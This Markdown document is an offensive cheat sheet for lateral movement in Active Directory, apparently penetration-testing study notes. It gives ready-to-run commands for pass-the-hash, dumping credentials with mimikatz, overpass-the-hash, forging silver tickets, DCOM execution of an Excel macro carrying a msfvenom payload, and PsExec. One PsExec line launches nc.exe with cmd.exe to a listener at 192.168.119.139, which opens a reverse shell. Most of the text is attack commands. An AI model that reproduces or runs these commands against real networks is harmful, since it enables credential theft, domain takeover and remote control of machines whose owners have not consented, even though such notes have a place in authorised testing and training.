# Lateral Movement

>Since we have located high-valuable targets logged on some workstations/servers and we have obtained password hashes and tickets from current machine, we can move laterally to try compromise these high value targets that could lead to full AD compromise.

## Pass the Hash

> Allows us to authenticate to a remote system or service using the NTLM hash of a user (will not work for Kerberos authentication).

 ```bash
#From our kali machine:
pth-winexe -U $USER%$NTLMHASH //$IPADDRESS cmd
#Change $IPADDRESS to the remote machine.
 ```

**Note:** This method only works for AD domain accounts and the built-in local administrator account.

## SMBMap with hashes

If we get a hash we can try to use smbmap in order to test if the user have write access to the C vol or C$, then we can crack that hash to and use PsExec to get a shell.

```bash
smbmap -u $USERNAME -p $HASH(xxx:xxx) -H $IP_ADDRESS

```

## Overpass the Hash

Thanks to this method we can abuse the NTLM hash of a user to gain a full kerberos TGT or TGS which grants us access to another machine or service as that user.

Imagine we have compromised a workstation and there are cached NTLM hashes of other users. The first step is to grab the NTLM hash of a user using mimikatz:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Now we have to use the following mimikatz tool open a powershell prompt as the context of this user:

```bash
sekurlsa::pth /user:$USERNAME /domain:$DOMAINNAME /ntlm:$NTLMHASH /run:PowerShell.exe
```

Next, if there are no Kerberos tickets cached, we have to generate one:

```bash
#List current tickets:
klist

#Generate a TGT by authenticating somewhere:
net use \\$DCHOSTNAME
```

Now we have a full Kerberos TGT which allows us to use any tools that rely on Kerberos authentication:. For example, login as this user on the domain controller:

```bash
.\PsExec \\$DCHOSTNAME cmd.exe
```

## Pass The Ticket

The overpass the hash used before provides us with a TGT ticket which is only usable on the machine it was created for. Pass The Ticket attack takes advantage of the TGS which may be exported and re-injected elsewhere used to authenticate to a specific service.

With the SPN service account password or its associated NTLM hash we can forge our own TGS to access the target resource with any permission we desire (silver ticket).

We make use of mimikatz kerberos::golden command to create this ticket.

**Step 1:** Find the SID of the domain:

```bash
whoami /user
#SID is all the output minus the last part (last 4 numbers)
```

**Step 2:** Craft the ticket:

```bash
kerberos::golden /user:$DOMAINUSER /domain:$DOMAIN /sid:$SID /target:$SPNNAME /service:$SERVICE /rc4:$NTLMHASH /ptt

#user: Domain user we currently are, not the service user.
#service: First part of serviceprincipalname (until "\").
#ppt: Injects directly the ticket in memory. Remove to save the ticket on disk.
#rc4: NTLM hash of the password.
```

This service ticket will have permissions as built-in local administrator user (500) and Domain Admins (plus other high privileged) AD group. Once loaded into memory, we can interact with the service and gain access to any information, including command execution.

## DCOM

We can use DCOM (like Macros from Excel) to perform a lateral movement technique. This method will allow us to execute a Visual Basic Macro remotely. Note: Office shoud lbe installed on the remote machine.

**Step1:** Create a document and paste the following macro:

```bash
#Create the payload with msfvenom with format (hta-psh)
Sub MyMacro()
Dim Str As String

Str = Str + "$PAYLOAD"
Str = Str + "$PAYLOAD"

Shell (Str)

End Sub
```

**Step 2:** Execute the following code on a PS window in order yo upload the file to the remote machine and execute the macro.

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$REMOTEIPADDRESS"))
$LocalPath = "$LOCALPATH\$FILENAME.xls"
$RemotePath = "\\$REMOTEIPADDRESS\c$\$FILENAME.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\$REMOTEIPADDRESS\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\$FILENAME.xls")
$com.Run("mymacro")

#Note: filename must be .xls
```

## PsExec

The credentials supplied to PsExec must have elevated privileges on the targeted client machine. If we can not pass the hash to PsExec, use the metasploit module.

#### Using PsExec.exe (local machine)

Connect to a remote machine using known credentials or hashes:

```bash
#32 bits:
PsExec.exe -u $USERNAME -p $PASSWORD C:\temp\nc.exe 192.168.119.139 1233 -e C:\windows\system32\cmd.exe


#64 bits:
PsExec64.exe -u $USERNAME -p $PASSWORD C:\temp\nc.exe 192.168.119.139 1233 -e C:\windows\system32\cmd.exe
```

#### Using psexec.py (kali)

```bash
python psexec.py $USERNAME@$IP_ADDRESS
```
